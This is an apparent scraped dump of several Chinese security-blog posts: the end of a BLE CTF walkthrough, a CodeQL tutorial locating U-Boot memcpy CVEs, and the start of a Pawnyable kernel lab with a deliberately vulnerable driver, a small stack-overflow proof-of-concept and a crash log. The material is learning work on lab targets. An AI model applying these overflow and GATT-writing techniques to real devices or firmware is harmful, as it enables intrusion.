ztree@ubuntu2:~/bt/ble_ctf/solutions$ gatttool -b C0:49:EF:66:26:DE --char-write-req -a 0x0054 -n $(echo -n &quot;hello&quot;|xxd -ps) Characteristic value was written successfully ztree@ubuntu2:~/bt/ble_ctf/solutions$ gatttool -b C0:49:EF:66:26:DE --char-read -a 0x0054|awk -F':' '{print $2}'|tr -d ' '|xxd -r -p;printf '\\n' fbb966958f ztree@ubuntu2:~/bt/ble_ctf/solutions$ echo &quot;30 37 65 34 61 30 63 63 34 38&quot; | xxd -r -p;printf '\\n' 07e4a0cc48 ztree@ubuntu2:~/bt/ble_ctf/solutions$ gatttool -b C0:49:EF:66:26:DE --char-write-req -a 0x002c -n $(echo -n &quot;fbb966958f07e4a0cc48&quot;|xxd -ps) Characteristic value was written successfully ztree@ubuntu2:~/bt/ble_ctf/solutions$ gatttool -b C0:49:EF:66:26:DE --char-read -a 0x002a|awk -F':' '{print $2}'|tr -d ' '|xxd -r -p;printf '\\n' Score:19/20 Flag 0x0056 Description OSINT the author! Hint Figure out the authors twitter handle and do what 0x0056 tells you to do! ztree@ubuntu2:~/bt/ble_ctf/solutions$ echo -n &quot;hackgnar&quot; | md5sum | cut -b 1-20 fe40eb2449bda7f9a997 ztree@ubuntu2:~/bt/ble_ctf/solutions$ gatttool -b C0:49:EF:66:26:DE --char-write-req -a 0x002c -n $(echo -n &quot;fe40eb2449bda7f9a997&quot;|xxd -ps) Characteristic value was written successfully ztree@ubuntu2:~/bt/ble_ctf/solutions$ gatttool -b C0:49:EF:66:26:DE --char-read -a 0x002a|awk -F':' '{print $2}'|tr -d ' '|xxd -r -p;printf '\\n' Score:19/20 ztree@ubuntu2:~/bt/ble_ctf/solutions$ echo -n &quot;@hackgnar&quot; | md5sum | cut -b 1-20 d953bfb9846acc2e15ee ztree@ubuntu2:~/bt/ble_ctf/solutions$ gatttool -b C0:49:EF:66:26:DE --char-write-req -a 0x002c -n $(echo -n &quot;d953bfb9846acc2e15ee&quot;|xxd -ps) Characteristic value was written successfully ztree@ubuntu2:~/bt/ble_ctf/solutions$ gatttool -b C0:49:EF:66:26:DE --char-read -a 0x002a|awk -F':' '{print $2}'|tr -d ' '|xxd -r -p;printf '\\n' Score:20/20 参考文献 https://github.com/hackgnar/ble_ctf https://bbs.kanxue.com/thread-271543.htm#msg_header_h1_2 ","link":"https://lzxzl.github.io/post/bluetooth-gatt-ble_ctf/"},{"title":"CodeQL入门 - U-Boot Challenge","content":" 根据GitHub Security Lab CTF 2: U-Boot Challenge来学习codeql， 官方的那个github机器人好像已经没了？那就自己写完跟网上的“标准答案”对比一下吧 1 环境搭建 1.1 codeql-cli &amp; visual studio code &amp; 插件codeql 略:) 好吧，安装与配置请参考：https://blog.csdn.net/weixin_43847838/article/details/130657057 1.2 clone vscode-codeql-starter git clone --recursive https://github.com/github/vscode-codeql-starter 如果报错ssl timeout，那就在/etc/hosts里加上github的ip，比如这样：140.82.113.3 github.com 查询github ip的网址：https://www.ipaddress.com/site/github.com 1.3 下载u-boot已有数据库 下载：U-Boot CodeQL database 然后解压 ❯ unzip u-boot_u-boot_cpp-srcVersion_d0d07ba86afc8074d79e436b1ba4478fa0f0c1b5-dist_odasa-2019-07-25-linux64.zip ❯ ll total 1011776 drwxr-xr-x 5 lzx staff 160B 6 6 23:33 attach drwxr-xr-x 38 lzx staff 1.2K 6 5 23:02 codeql drwxr-xr-x@ 22 lzx staff 704B 5 24 18:28 codeql-cli -rw-r--r--@ 1 lzx staff 420M 6 5 23:01 codeql-cli.zip -rw-r--r--@ 1 lzx staff 2.1K 6 7 00:00 codeql.md -rw-r--r--@ 1 lzx staff 74M 6 5 23:21 u-boot_u-boot_cpp-srcVersion_d0d07ba86afc8074d79e436b1ba4478fa0f0c1b5-dist_odasa-2019-07-25-linux64.zip drwxr-xr-x@ 9 lzx staff 288B 6 7 00:01 u-boot_u-boot_d0d07ba &lt;-- 解压结果 drwxr-xr-x 21 lzx staff 672B 6 6 22:51 vscode-codeql-starter 1.4 导入vscode-codeql-starter VSCode：File-&gt;Open workspace from file...-&gt;选择vscode-codeql-starter.code-workspace 1.5 导入u-boot 数据库 VSCode Extension CODEQL:From a folder（因为我前面解压了） 参考：choosing-a-database 这个数据库对应的u-boot版本是d0d07ba86afc8074d79e436b1ba4478fa0f0c1b5 如果要自己创建数据库，那就clone这个版本的代码，然后再用codeql-cli创建 proxychains4 git clone https://github.com/u-boot/u-boot.git cd u-boot git reset --hard d0d07ba86afc8074d79e436b1ba4478fa0f0c1b 1.6 clone 课程仓库 现在是2023年，官方的仓库没了？那就在github上找一个。 git clone https://github.com/hluwa/codeql-uboot.git 1.7 把课程仓库添加到前面的starter workspace File -&gt; Add Folder to Workspace... 添加完之后长下面这样，环境就搭建完了。 到这里，环境就算搭建好了。接下来看看这个实验的描述： The goal of this challenge is to find the 13 remote-code-execution vulnerabilities that our security researchers found in the U-Boot loader. The vulnerabilities can be triggered when U-Boot is configured to use the network for fetching the next stage boot resources. MITRE has issued the following CVEs for the 13 vulnerabilities: CVE-2019-14192, CVE-2019-14193, CVE-2019-14194, CVE-2019-14195, CVE-2019-14196, CVE-2019-14197, CVE-2019-14198, CVE-2019-14199, CVE-2019-14200, CVE-2019-14201, CVE-2019-14202, CVE-2019-14203, and CVE-2019-14204. Through these vulnerabilities an attacker in the same network (or controlling a malicious NFS server) could gain code execution at the U-Boot powered device. The first two occurrences of the vulnerability were plain memcpy overflows with an attacker-controlled size coming from the network packet without any validation. The memcpy function copies n bytes from memory area src to memory area dest. This can be unsafe when the size being parsed is not appropriately validated, allowing an attacker to fully control the data and length being passed through. U-Boot contains hundreds of calls to memcpy and libc functions that read from the network such as ntohl and ntohs. In this challenge, you will use CodeQL to find those calls. Of course many of those calls are safe, so throughout this challenge you will refine your query to reduce the number of false positives. Upon completion of the challenge, you will have a query that is able to find many of the vulnerabilities that allow for remote execution of arbitrary code on U-Boot powered devices. 2 Step 0: Finding the definition of memcpy, ntohl, ntohll, and ntohs 2.1 找到所有名为strlen的函数定义 把下面这段代码拷贝到3_function_definitions.ql import cpp from Function f where f.getName() = &quot;strlen&quot; select f, &quot;a function named strlen&quot; 选中3_function_definitions.ql，右键-&gt;CodeQL: Run Queries in Selected Files Question 0.0: Can you work out what the above query is doing? 功能是查询所有名为strlen的函数定义，根据结果来看，包括函数定义和函数声明。 import cpp : 导入 c++ 规则库 From Function f : 声明一个 Function 类的变量为 f where f.getName() = &quot;strlen&quot; : f.getName() 用于获取此变量的名称，也就是满足条件：和strlen相同的Function会被选出来 select f,&quot;a function named strlen&quot; : select的作用是选择要显示的结果，用逗号分隔。嗯，和sql一样。 2.2 找到所有名为memcpy的函数定义 Question 0.1: Modify the query to find the definition of memcpy. Hint: Queries have a from, where, and select clause. Have a look at this introduction to the QL language. 这个简单，直接上代码： import cpp from Function f where f.getName() = &quot;memcpy&quot; select f, &quot;a function named memcpy&quot; 2.3 找到所有名为ntohl、 ntohll和 ntohs的函数定义或宏定义 Question 0.2: ntohl, ntohll, and ntohs can either be functions or macros (depending on the platform where the code is compiled). As these snapshots for U-Boot were built on Linux, we know they are going to be macros. Write a query to find the definition of these macros. Hint: The CodeQL Query Console has an auto-completion feature. Hit Ctrl-Space after the from clause to get the list of objects you can query. Wait a second after typing myObject. to get the list of methods. hmm..query cosole？ctrl-space？ Hint: We can use a regular expression to write a query that searches for all three macros at once. 借助正则表达式，一次查询三个宏的定义 import cpp from Macro m where m.getName().regexpMatch(&quot;ntoh(l|ll|s)&quot;) select m, &quot;ntohl, ntohll, and ntohs&quot; 或者可以通过集合表达式来查询： import cpp from Macro m // where m.getName().regexpMatch(&quot;ntoh(l|ll|s)&quot;) // select m, &quot;ntohl, ntohll, and ntohs&quot; // where &lt;your_variable_name&gt; in [“bar”, “baz”, “quux”] where m.getName() in [&quot;ntohs&quot;,&quot;ntohl&quot;,&quot;ntohll&quot;] select m, &quot;ntohl, ntohll, and ntohs 22222&quot; ntoh 族函数通常用来进行网络字节序到主机字节序的转换 参考： https://bestwing.me/codeql.html https://milkii0.github.io/2022/06/10/CodeQLU-BootChallenge%20(CC++)/ 3 Step 1: Finding the calls to memcpy, ntohl, ntohll, and ntohs 3.1 找到所有memcpy的调用 Question 1.0: Find all the calls to memcpy. Hint: Use the auto-completion feature on the function call variable to guess how to express the relation between a function call and a function, and how to bind them. import cpp from FunctionCall fc // FunctionCall.getTarget()：返回值类型的是Function，功能是获取被这个函数调用fc所调用的函数 where fc.getTarget().getName() = &quot;memcpy&quot; // 如果fc调用的函数的名称是memcpy select fc 3.2 找到所有ntohl、 ntohll 和 ntohs的调用 Question 1.1: Find all the calls to ntohl, ntohll, and ntohs. Hint: calls to ntohl, ntohll, and ntohs are macro invocations, unlike memcpy which is a function call. MacroInvocation类似上面的FunctionCall 如下图，MacorInvocation.getMacro()的功能是获取被这个Invocation访问的宏。 答案如下，看结果好像项目里没有调用ntohll宏的地方？ import cpp from MacroInvocation mi where mi.getMacro().getName().regexpMatch(&quot;ntoh(l|ll|s)&quot;) select mi 3.3 找到所有包含上面宏调用的表达式 Question 1.2: Find the expressions that resulted in these macro invocations. Hint: We need to get the expression of the macro invocation we found in 1.1 找到有Q1.1宏调用的表达式？一开始我不大理解这个问题，上面不是找到宏调用的地方了吗？然后想了想，Q1.1是要找到所有calls，而这里要找到有calls的expressions。那么前面的where限定应该不用改，MacroInvocation应该可以get Expression，那就在用代码补全再看看吧： 获取这个宏调用相关的top-level expression，并且如果top-level的expanded元素不是表达式的话，会获取失败。所以，mi.getExpr()的结果应该是mi的子集。果然，执行后，翻了翻结果，数量和内容和Q1.1是一样的。 另外，这个top-level expression是什么？ What is a top-level expression? import cpp from MacroInvocation mi where mi.getMacro().getName().regexpMatch(&quot;ntoh(l|ll|s)&quot;) select mi.getExpr() 结果如下： 4 Step 2: Data flow analysis For this step, we want to detect cases where some data read from the network will end up being used by a call to memcpy. To do this, we’ll use the CodeQL taint tracking library, and its predicate hasFlowPath that will tell us when some data coming from a source flows to a sink. Use the boiler plate provided below to complete your taint tracking query. 想要检测这样的情况：从网络读取的数据最终被传给memcpy使用。为了做到这个，将使用CodeQL污点跟踪库。它有一个名叫hasFlowPath的谓词，其作用是告诉我们来自source的数据什么时候流向sink。用下面提供的样板来完成污点跟踪查询。这个样板在下面的Q2.1（写这句废话是因为在Q2.0加了一些东西，可能你一下看不到）。 上面文字有个链接，点进去后，是对TaintTracking模块的简单介绍： Question 2.0: Write a QL class that finds all the top-level expressions associated with the macro invocations to the calls to ntohl, ntohll, and ntohs. Hint: Querying this class should give you the same results as in question 1.2 就是让换种写法来获取Q1.2的结果，要用QL Class。根据它给的链接学一下QL Class，然后重写Q1.2的答案： import cpp // 定义一个类： // 1. 要有class关键字 // 2. 类名首字母必须大写 // 3. 类的supertypes需要由关键字 extends 或者 instanceof 来声明 // 4. 类的body要闭合 class MyMacroInvocation extends MacroInvocation{ // 这个类继承MacroInvocation MacroInvocation mi;// 声明一个宏调用的变量 MyMacroInvocation(){ // characteristic predicate， 类似构造函数 // mi满足下面的条件，并且this等于mi mi.getMacro().getName().regexpMatch(&quot;ntoh(l|ll|s)&quot;) and this = mi } } from MyMacroInvocation mmi select mmi.getExpr() // 获取满足上面条件的宏调用的表达式 当然，如果要定义一个extends Expr类的类，方法也是类似的： // 解法3: import cpp class MyExpr extends Expr { MacroInvocation mi; MyExpr(){ mi.getMacro().getName().regexpMatch(&quot;ntoh(l|ll|s)&quot;) and this = mi.getExpr() } } from MyExpr me select me, &quot;33333&quot; 后来看了这篇文章，发现还有exists关键词，另一种解法： import cpp class NetworkByteSwap extends Expr { NetworkByteSwap() { exists(MacroInvocation mi | mi.getMacro().getName().regexpMatch(&quot;ntoh.*&quot;) | mi.getExpr() = this) } } from NetworkByteSwap n select n, &quot;Network byte swap&quot; Question 2.1: Create the configuration class, by defining the source and sink. The source should be calls to ntohl, ntohll, or ntohs. The sink should be the size argument of an unsafe call to memcpy. 创建一个定义了source和sink的configuration类，source应该对notch*的调用，sink则应该是不安全函数memcpy的size参数。 ntoh 族函数通常用来进行网络字节序到主机字节序的转换。所以这里的意思应该是noth族函数会将外部传入的数据包中的某些数据转换一个数值，而这个数值可能最终会被传给memcpy作为size参数，使得拷贝的长度被攻击者控制，就可能会产生安全风险。 Hint: The source should be an instance of the class you wrote in part 2.0. Hint: The sink should be the size argument of calls to memcpy. 下面这个是模板 /** * @kind path-problem */ import cpp import semmle.code.cpp.dataflow.TaintTracking import DataFlow::PathGraph class YOUR_CLASS_HERE extends Expr { // 2.0 Todo } class Config extends TaintTracking::Configuration { Config() { this = &quot;NetworkToMemFuncLength&quot; } override predicate isSource(DataFlow::Node source) { // 2.1 Todo } override predicate isSink(DataFlow::Node sink) { // 2.1Todo } from Config cfg, DataFlow::PathNode source, DataFlow::PathNode sink where cfg.hasFlowPath(source, sink) select sink, source, sink, &quot;ntoh flows to memcpy&quot; 先研究一下模板，先从“main函数”部分开始看： // 1. 声明3个变量，Config类型的cfg，PathNode类型的source和sink from Config cfg, DataFlow::PathNode source, DataFlow::PathNode sink // 2. 将source 和 sink 作为参数传入hasFlowPath。顾名思义，也就是判断是否有从source到sink的数据流动的path where cfg.hasFlowPath(source, sink) // 3. 打印sink 和source，不过为啥要打印两遍sink？ select sink, source, sink, &quot;ntoh flows to memcpy&quot; 看看cfg.hasFlowPath的描述，ctrl+左击： /** * Holds if data may flow from `source` to `sink` for this configuration. * * The corresponding paths are generated from the end-points and the graph * included in the module `PathGraph`. */ 相应的path是通过模块PathGraph里的end-points和graph来生成的 再来看看Configuration类的子类： class Config extends TaintTracking::Configuration { Config() { this = &quot;NetworkToMemFuncLength&quot; } override predicate isSource(DataFlow::Node source) { // 2.1 Todo } override predicate isSink(DataFlow::Node sink) { // 2.1Todo } 提炼一下官方文档 configuration对这个类的描述： 该类定义了对于一个analysis来说，sources、sinks等可配置的选项。也就是说这是一个包含谓词的类，这些谓词定义了数据如何在source和sink之间流动 为了创建一个configuration，需要创建一个继承该类的子类。它的characteristic predicate（可看作构造函数）是一个独一无二的字符串，比如模版中写的NetworkToMemFuncLength Configuration类的override member predicate（可看作成员函数）中，必须要覆写的有isSource和isSink，其他都是可选的。 为了查询是否有从source到sink的流，写法如下：exists(MyAnalysisConfiguration cfg | cfg.hasFlow(source, sink)) 多个Configuration可以共存，但是不支持在一个Configuration类的override predicate里去写怎么依赖另一个Configuration。hmm...这个还是得看例子才知道怎么写。 按照一般写代码的经验，isSource和isSink这两个is开头的谓词（函数）应该是写：判断这个source/sink要满足什么条件，然后返回true/false。但是呢，搂一眼介绍predicate的官方文档，按照文档上面的例子来看，只需要写需要满足什么条件就ok： Predicates are used to describe the logical relations that make up a QL program. 谓词用来描述QL程序里的逻辑关系 Strictly speaking, a predicate evaluates to a set of tuples. 严格来讲，谓词的计算结果是一组元组 predicate isCountry(string country) { country = &quot;Germany&quot; or country = &quot;Belgium&quot; or country = &quot;France&quot; } 那大概就知道怎么写这两个谓词了： /** * @kind path-problem */ import cpp import semmle.code.cpp.dataflow.TaintTracking import DataFlow::PathGraph class MyExpr extends Expr { // 2.0 Todo MacroInvocation mi; MyExpr(){ mi.getMacro().getName().regexpMatch(&quot;ntoh(l|ll|s)&quot;) and this = mi.getExpr() } } class Config extends TaintTracking::Configuration { Config() { this = &quot;NetworkToMemFuncLength&quot; } override predicate isSource(DataFlow::Node source) { // 2.1 Todo source.asExpr() instanceof MyExpr } override predicate isSink(DataFlow::Node sink) { // 2.1Todo // 存在memcpy的函数调用，并且该调用的第二个参数是sink.asExpr() exists(FunctionCall fc | fc.getTarget().hasName(&quot;memcpy&quot;) | sink.asExpr() = fc.getArgument(2)) } } from Config cfg, DataFlow::PathNode source, DataFlow::PathNode sink where cfg.hasFlowPath(source, sink) select sink, source, sink, &quot;ntoh flows to memcpy&quot; 5 Step 3: Find additional vulnerabilities 根据Q2.1查询结果进行代码审计 Question 3.0: There are 13 known vulnerabilities in U-Boot. The query you completed above probably found 9 of them. See if you can refine your query to find 1 or more additional vulnerabilities. 上面完成的查询可能找到13个漏洞中的9个。这里让我们尝试改进查询，以找到更多的漏洞。 在改进前，我们先根据前面的查询结果看看是不是已经能找到9个漏洞了。 CVE-2019-14192、 CVE-2019-14193 和 CVE-2019-14199 结果【1】和【2】的source是在函数net_process_received_packet的末尾，此处很明显会发生integer underflow： 然后将underflow的整数传递进函数nc_input_packet，但是第149行检测了len的大小，这样我觉得即使传入一个很大的len，这里的memcpy也不会发生越界写。。然而我查了一下，U-Boot NFS RCE Vulnerabilities (CVE-2019-14192)说这里是会越界写的。。。但是他就一句话，没懂。。。 然后找了一下patch，对应的编号有CVE-2019-14192、 CVE-2019-14193 和 CVE-2019-14199。三个？ CVE-2019-14197、CVE-2019-14200、 CVE-2019-14201、CVE-2019-14202、CVE-2019-14203 和 CVE-2019-14204 结果【1】【2】的source边上很明显还有一个整数回绕，将underflow的整数传递给函数指针udp_packet_handler，QL的查询结果里没有此处。 先审计一下是否存在漏洞，搜索udp_packet_handler，只有两处赋值的地方： 再搜索函数net_set_udp_handler，可以看到分别给nc、dhcp、bootp和nfs都设置了handler。 不想一个一个审计了，直接看文章U-Boot NFS RCE Vulnerabilities (CVE-2019-14192)知道漏洞都存在于nfs_handler。那就只审计它。可以看到，该函数仍然未校验len，直接在不同分支里将其分别传递给函数: static void nfs_handler(uchar *pkt, unsigned dest, struct in_addr sip, unsigned src, unsigned len) { int rlen; int reply; debug(&quot;%s\\n&quot;, __func__); if (dest != nfs_our_port) return; switch (nfs_state) { case STATE_PRCLOOKUP_PROG_MOUNT_REQ: if (rpc_lookup_reply(PROG_MOUNT, pkt, len) == -NFS_RPC_DROP) break; ...... break; case STATE_PRCLOOKUP_PROG_NFS_REQ: if (rpc_lookup_reply(PROG_NFS, pkt, len) == -NFS_RPC_DROP) break; ...... break; case STATE_MOUNT_REQ: reply = nfs_mount_reply(pkt, len); ...... break; case STATE_UMOUNT_REQ: reply = nfs_umountall_reply(pkt, len); ...... break; case STATE_LOOKUP_REQ: reply = nfs_lookup_reply(pkt, len); ...... break; case STATE_READLINK_REQ: reply = nfs_readlink_reply(pkt, len); ...... break; case STATE_READ_REQ: rlen = nfs_read_reply(pkt, len); ...... break; } } rpc_lookup_reply -&gt;未检验len，直接memcpy(&amp;rpc_pkt.u.data[0], pkt, len); -&gt; 存在越界写漏洞 nfs_mount_reply-&gt;未检验len，直接memcpy(&amp;rpc_pkt.u.data[0], pkt, len); -&gt; 存在越界写漏洞 nfs_umountall_reply-&gt;未检验len，直接memcpy(&amp;rpc_pkt.u.data[0], pkt, len); -&gt; 存在越界写漏洞 nfs_lookup_reply-&gt;未检验len，直接memcpy(&amp;rpc_pkt.u.data[0], pkt, len); -&gt; 存在越界写漏洞 nfs_readlink_reply-&gt;未检验len，直接memcpy((unsigned char *)&amp;rpc_pkt, pkt, len);-&gt; 存在越界写漏洞 nfs_read_reply-&gt;差点就错过了 memcpy(&amp;rpc_pkt.u.data[0], pkt, sizeof(rpc_pkt.u.reply)); pkt的大小可能没有sizeof(rpc_pkt.u.reply)这么大，存在越界读 struct rpc_t { union { uint8_t data[NFS_READ_SIZE + (6 + NFS_MAX_ATTRS) * sizeof(uint32_t)]; struct { uint32_t id; uint32_t type; uint32_t rpcvers; uint32_t prog; uint32_t vers; uint32_t proc; uint32_t data[1]; } call; struct { uint32_t id; uint32_t type; uint32_t rstatus; uint32_t verifier; uint32_t v2; uint32_t astatus; uint32_t data[NFS_READ_SIZE / sizeof(uint32_t) + NFS_MAX_ATTRS]; } reply; } u; } __attribute__((packed)); 所以，这里有6个漏洞，经查询patch，对应的CVE编号为：CVE-2019-14197、CVE-2019-14200、 CVE-2019-14201、CVE-2019-14202、CVE-2019-14203 和 CVE-2019-14204。 CVE-2019-14195 结果【4】【5】对应存在一个漏洞，从packet获取rlen之后，没有校验就直接传给memcpy。 经查询，CVE编号为：CVE-2019-14195，patch如下： CVE-2019-14196 【6】nfs_lookup_reply()，目标buffer：filefh的长度是64，传入的长度是负数的时候就会越界写。漏洞+1。 查询后，该漏洞编号是CVE-2019-14196，patch如下： CVE-2019-14194/CVE-2019-14198 继续，结果【7】【8】又对应两个漏洞，他两的souce分别在函数nfs_read_reply的if和else分支里，将可控的rlen传入函数store_block中进行memcpy，可进行任意长度的越界写。96行的函数flash_write同样存在问题。 分别对应的CVE编号：CVE-2019-14194/CVE-2019-14198。patch如下： Question 3.1: Generalize your query to find other untrusted inputs (not only networking) such as ext4 fs. 菜鸡不懂，ext4 fs的输入有啥类似ntoh*的特征？ 总结 简单入了个门吧。。。 遗留问题 遗留问题： CVE-2019-14192、 CVE-2019-14193 和 CVE-2019-14199是咋回事？ Q3.0说能根据查询结果找到9个漏洞，是哪9个？ Q3.1 对于通过设置handler的情况，怎么查询？ 参考文献 https://securitylab.github.com/ctf/uboot/ https://github.com/githubpartners/learning-lab-markdown/blob/b6f23b5f6573b031e0bbb7178268f4802b04b132/codeql-uboot.md https://milkii0.github.io/2022/06/10/CodeQLU-BootChallenge%20(CC++)/ https://securitylab.github.com/research/uboot-rce-nfs-vulnerability/ ","link":"https://lzxzl.github.io/post/codeql-ru-men-u-boot-challenge/"},{"title":"Pawnyable4 - 熟悉Holstein模块与触发漏洞","content":"首先回顾一下初始化的过程：/init -&gt; /sbin/init -&gt;......-&gt;/etc/init.d/rcS-&gt;/etc/init.d/S99pawnyable # /etc/init.d/S99pawnyable #!/bin/sh ## ## Setup ## mdev -s mount -t proc none /proc mkdir -p /dev/pts mount -vt devpts -o gid=4,mode=620 none /dev/pts chmod 666 /dev/ptmx stty -opost #echo 2 &gt; /proc/sys/kernel/kptr_restrict # 禁用KADR #echo 1 &gt; /proc/sys/kernel/dmesg_restrict # 禁用dmesg_restrict ## ## Install driver ## insmod /root/vuln.ko # 加载内核模块 # 将名为的/dev/holstein模块与名为holstein的字符设备文件关联 mknod -m 666 /dev/holstein c `grep holstein /proc/devices | awk '{print $1;}'` 0 ## ## User shell ## echo -e &quot;\\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\\n&quot; echo &quot;[ Holstein v1 (LK01) - Pawnyable ]&quot; #setsid cttyhack setuidgid 1337 sh # 以用户ID 1337 运行 shell，即普通用户 setsid cttyhack setuidgid 0 sh # 以用户ID 0 运行 shell，即root用户 ## ## Cleanup ## umount /proc poweroff -d 0 -f Holstein模块 src/vuln.c是内核子模块Holstein的源码，下面来分析一下linux里内核子模块是怎么写的： 初始化和退出 编写内核模块时，总是先编写初始化和退出，这里指定了初始化函数和退出函数 108 module_init(module_initialize); 109 module_exit(module_cleanup); 先来看初始化函数： /** * * int alloc_chrdev_region(dev_t *dev,unsigned int firstminor,unsigned int count,char *name); * 功能：用于动态申请设备编号 * firstminor：通常为0 * dev：存放返回的设备号 * * * void cdev_init(struct cdev *, const struct file_operations *) * 功能：初始化一个静态分配的cdev结构体变量 * 第一个参数：第一个参数表示一个字符设备，在函数中即将被初始化 * 第二个参数：file_operations结构体类型的指针，通过这个结构体中提供的函数完成对设备的操作 * * * THIS_MODULE：是一个宏，定义为：#define THIS_MODULE (&amp;__this_module) * 而__this_module是一个struct module变量，代表当前模块 * * * int cdev_add(struct cdev *, dev_t, unsigned) * 功能：向Linux内核系统中添加一个新的cdev结构体变量所描述的字符设备，并且使这个设备立即可用 * 第一个参数：即将被添加入Linux内核系统的字符设备 * 第二个参数：设备的设备号 * 第三个参数：想注册设备的设备号的范围，用于给struct cdev中的字段count赋值 **/ 8 MODULE_LICENSE(&quot;GPL&quot;); 9 MODULE_AUTHOR(&quot;ptr-yudai&quot;); 10 MODULE_DESCRIPTION(&quot;Holstein v1 - Vulnerable Kernel Driver for Pawnyable&quot;); 11 12 #define DEVICE_NAME &quot;holstein&quot; 13 #define BUFFER_SIZE 0x400 14 15 char *g_buf = NULL; 80 static dev_t dev_id; 81 static struct cdev c_dev; 82 83 static int __init module_initialize(void) 84 { 85 if (alloc_chrdev_region(&amp;dev_id, 0, 1, DEVICE_NAME)) { // 给字符设备 holstein 分配设备号dev_id 86 printk(KERN_WARNING &quot;Failed to register device\\n&quot;); 87 return -EBUSY; 88 } 89 90 cdev_init(&amp;c_dev, &amp;module_fops); // 初始化字符设备c_dev 91 c_dev.owner = THIS_MODULE; 92 93 if (cdev_add(&amp;c_dev, dev_id, 1)) { // 向Linux内核系统中添加字符设备 94 printk(KERN_WARNING &quot;Failed to add cdev\\n&quot;); 95 unregister_chrdev_region(dev_id, 1); 96 return -EBUSY; 97 } 98 99 return 0; 100 } 该字符设备定义了4个操作函数：open、read、write和release 71 static struct file_operations module_fops = 72 { 73 .owner = THIS_MODULE, 74 .read = module_read, 75 .write = module_write, 76 .open = module_open, 77 .release = module_close, 78 }; 而模块的退出只是删除了字符设备： 102 static void __exit module_cleanup(void) 103 { 104 cdev_del(&amp;c_dev); 105 unregister_chrdev_region(dev_id, 1); 106 } open open这个模块的时候，分配了0x400字节的空间给全局变量g_buf 13 #define BUFFER_SIZE 0x400 14 15 char *g_buf = NULL; 17 static int module_open(struct inode *inode, struct file *file) 18 { // 将字符串打印到内核的日志缓冲区 // KERN_INFO是日志级别 // 可以使用命令dmesg来查看输出 19 printk(KERN_INFO &quot;module_open called\\n&quot;); 20 // 从内核空间中分配0x400大小的堆块给g_buf 21 g_buf = kmalloc(BUFFER_SIZE, GFP_KERNEL); 22 if (!g_buf) { 23 printk(KERN_INFO &quot;kmalloc failed&quot;); 24 return -ENOMEM; 25 } 26 27 return 0; 28 } close 释放g_buf 64 static int module_close(struct inode *inode, struct file *file) 65 { 66 printk(KERN_INFO &quot;module_close called\\n&quot;); 67 kfree(g_buf); 68 return 0; 69 } read 将内核空间中 g_buf 的内容，最终拷贝到来自用户空间的read函数的参数buf 30 static ssize_t module_read(struct file *file, 31 char __user *buf, size_t count, 32 loff_t *f_pos) 33 { 34 char kbuf[BUFFER_SIZE] = { 0 }; 35 36 printk(KERN_INFO &quot;module_read called\\n&quot;); 37 38 memcpy(kbuf, g_buf, BUFFER_SIZE); // 将g_buf的内容拷贝到局部变量kbuf 39 if (_copy_to_user(buf, kbuf, count)) { // 将kbuf的内容拷贝到用户空间的buf 40 printk(KERN_INFO &quot;copy_to_user failed\\n&quot;); 41 return -EINVAL; 42 } 43 44 return count; 45 } write 将用户空间的buf的内容，最终拷贝到内核空间的全局变量g_buf 47 static ssize_t module_write(struct file *file, 48 const char __user *buf, size_t count, 49 loff_t *f_pos) 50 { 51 char kbuf[BUFFER_SIZE] = { 0 }; 52 53 printk(KERN_INFO &quot;module_write called\\n&quot;); 54 55 if (_copy_from_user(kbuf, buf, count)) { // 将用户空间的buf的内容拷贝到局部变量kbuf 56 printk(KERN_INFO &quot;copy_from_user failed\\n&quot;); 57 return -EINVAL; 58 } 59 memcpy(g_buf, kbuf, BUFFER_SIZE); // 将kbuf的内容拷贝到全局变量g_buf 60 61 return count; 62 } 栈溢出漏洞 g_buf的长度是0x400，而在上面的module_write()函数中，_copy_from_user的参数count是攻击者可控的，所以可能发生栈溢出（越界写）。进而可以覆写内核栈中的返回地址，并执行ROP链。 触发漏洞 在利用漏洞之前，先来尝试触发它，也就是写个POC。 // exploit.c（偷懒。。没改名字） #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;fcntl.h&gt; #include &lt;unistd.h&gt; #include &lt;string.h&gt; void fatal(const char *msg){ perror(msg); exit(1); } int main() { int fd = open(&quot;/dev/holstein&quot;, O_RDWR); if(fd == -1){ fatal(&quot;open(\\&quot;/dev/holstein\\&quot;)&quot;); } char buf[0x800] = {}; memset(buf, 'A', 0x800); write(fd, buf, 0x800); close(fd); return 0; } 然后执行transfer.sh，将poc传送进去，然后在shell里执行： lzx@ubuntu:~/LKPWN/pawnyable/LK01/qemu$ ./transfer.sh 3959 blocks qemu-system-x86_64: warning: TCG doesn't support requested feature: CPUID.01H:ECX.vmx [bit 5] Starting syslogd: OK Starting klogd: OK Running sysctl: OK Saving random seed: OK Starting network: udhcpc: started, v1.34.0 udhcpc: broadcasting discover udhcpc: broadcasting select for 10.0.2.15, server 10.0.2.2 udhcpc: lease of 10.0.2.15 obtained from 10.0.2.2, lease time 86400 deleting routers adding dns 10.0.2.3 OK Starting dhcpcd... dhcpcd-9.4.0 starting DUID 00:01:00:01:2b:9f:a7:9c:52:54:00:12:34:56 eth0: IAID 00:12:34:56 eth0: soliciting an IPv6 router eth0: Router Advertisement from fe80::2 eth0: adding address fec0::d946:4e76:702f:7f8e/64 eth0: adding route to fec0::/64 eth0: adding default route via fe80::2 eth0: soliciting a DHCP lease eth0: offered 10.0.2.15 from 10.0.2.2 eth0: leased 10.0.2.15 for 86400 seconds eth0: adding route to 10.0.2.0/24 eth0: adding default route via 10.0.2.2 forked to background, child pid 105 Boot took 6.75 seconds [ Holstein v1 (LK01) - Pawnyable ] / # ./exploit BUG: stack guard page was hit at (____ptrval____) (stack is (____ptrval____)..(____ptrval____)) kernel stack overflow (page fault): 0000 [#1] PREEMPT SMP NOPTI CPU: 0 PID: 162 Comm: exploit Tainted: G O 5.10.7 #1 Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014 RIP: 0010:memset_orig+0x33/0xb0 Code: 01 01 01 01 01 01 01 01 48 0f af c1 41 89 f9 41 83 e1 07 75 70 48 89 d1 48 c1 e9 06 74 39 66 0f 1f 84 00 00 00 00 00 48 ff c9 &lt;48&gt; 89 07 48 89 47 08 48 89 47 10 48 89 47 18 48 89 47 20 48 89 47 RSP: 0018:ffffc9000044ba58 EFLAGS: 00000207 RAX: 0000000000000000 RBX: 0000000000000558 RCX: 0000000000000009 RDX: 00000000000002a8 